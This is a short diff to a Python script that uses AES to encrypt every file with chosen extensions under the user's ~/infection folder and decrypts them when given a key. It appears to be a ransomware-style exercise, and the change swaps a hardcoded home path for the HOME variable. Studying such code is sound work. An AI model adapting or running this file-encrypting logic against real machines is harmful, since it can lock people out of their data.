@@ -3,6 +3,7 @@ import hashlib
 import base64
 from Crypto.Cipher import AES
 from Crypto import Random
+from sys import exit
 import os
 
 parser = argparse.ArgumentParser(description="Encrypt all files present in ~/infection")
@@ -76,7 +77,7 @@ def decrypt(key):
 	
 def find_files(extensions):
 	found = []
-	for root, dirnames, files in os.walk('/home/tedelin/infection'):
+	for root, dirnames, files in os.walk(home):
 		for filename in files:
 			if filename.endswith(tuple(extensions)):
 				found.append(os.path.join(root, filename))
@@ -85,7 +86,12 @@ def find_files(extensions):
 
 if args.v:
 	print("Version 1.0")
-if args.r:
-	decrypt(args.r)
-elif not args.r:
-	encrypt()
+else:
+	if 'HOME' not in os.environ:
+		print("Cannot find user HOME directory") 
+		exit()
+	home = os.environ['HOME'] + '/infection'
+	if args.r:
+		decrypt(args.r)
+	elif not args.r:
+		encrypt()
